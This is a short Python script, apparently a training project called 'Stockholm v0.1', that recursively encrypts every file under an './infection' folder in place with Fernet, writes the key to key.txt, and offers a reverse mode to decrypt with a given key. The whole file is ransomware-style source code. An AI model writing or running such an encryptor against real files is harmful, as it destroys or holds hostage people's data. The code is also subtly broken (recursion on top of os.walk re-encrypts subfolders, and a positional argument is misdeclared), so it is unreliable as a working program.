import os
import sys
import argparse
import cryptography
from cryptography.fernet import Fernet

def encrypt(path, key):
    print("Encrypting files...infuc")
    for root, dir, files in os.walk(path):
        for dirs in dir:
            encrypt(os.path.join(root, dirs), key)
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as file_obj:
                content = file_obj.read()
                fernet = Fernet(key)
                encrypted_content = fernet.encrypt(content)
            with open(file_path, "wb") as file_obj:
                file_obj.write(encrypted_content)


def decrypt(path, key):
    print("Decrypting files...")
    for root, dir, files in os.walk(path):
        for dirs in dir:
            decrypt(os.path.join(root, dirs), key)
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as file_obj:
                content = file_obj.read()
                fernet = Fernet(key)
                encrypted_content = fernet.decrypt(content)
            with open(file_path, "wb") as file_obj:
                file_obj.write(encrypted_content)

def main():
    path = './infection'
    key = Fernet.generate_key()
    
    with open('key.txt', 'wb') as key_file:
        key_file.write(key)
    
    parser = argparse.ArgumentParser(description='Encrypt/Decrypt files')
    parser.add_argument('path', help='Path to encrypt/decrypt', action='store_true')
    parser.add_argument('-v', '--version', help='Show version', action='store_true')
    parser.add_argument('-r', '--reverse', metavar='clave', help='Reverse string')
    args = parser.parse_args()

    if args.version:
        print("Stockholm v0.1")
    elif args.reverse:
        print("Decrypting files...")
        decrypt(path, args.reverse)
    else:
        print("Encrypting files...")
        encrypt(path, key)     

if __name__ == '__main__':
    main()